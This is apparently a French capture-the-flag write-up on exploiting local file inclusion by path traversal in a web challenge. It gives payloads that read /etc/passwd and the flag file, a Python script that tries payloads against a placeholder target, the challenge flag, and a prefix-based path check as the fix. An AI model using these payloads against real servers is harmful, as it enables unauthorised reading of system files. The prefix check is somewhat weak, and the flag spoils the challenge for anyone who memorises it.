# Writeup — LFI Reader

**Catégorie** : Web  
**Difficulté** : Hard  
**Points** : 250  
**Flag** : `CTF{lfi_path_traversal_to_root}`

## Contexte

Le Local File Inclusion (LFI) par path traversal permet à un attaquant de lire des fichiers arbitraires sur le serveur en manipulant les paramètres de chemin pour remonter dans l'arborescence.

## Étapes de résolution

### 1. Identifier le paramètre vulnérable

L'URL utilise `?file=docs/readme.txt` pour charger des fichiers. Tester si on peut remonter :

```
/?file=docs/../docs/readme.txt
```
Si ça fonctionne, le path traversal est possible.

### 2. Lire des fichiers système

```
/?file=../../../../etc/passwd
```

### 3. Lire le flag

```
/?file=../../../../flag.txt
```

ou plus directement :
```
/?file=/flag.txt
```

**Résultat** : `CTF{lfi_path_traversal_to_root}`

## Script Python

```python
import requests

base = "http://TARGET:5034"
payloads = [
    "/flag.txt",
    "../../../../flag.txt",
    "../../../flag.txt",
]

for p in payloads:
    r = requests.get(f"{base}/", params={"file": p})
    if "CTF{" in r.text:
        print(f"[+] Flag found with payload: {p}")
        break
```

## Correction

Valider et normaliser les chemins côté serveur :
```python
from pathlib import Path

base = Path("/app/docs").resolve()
target = (base / filename).resolve()
if not str(target).startswith(str(base)):
    return "Access denied", 403
```
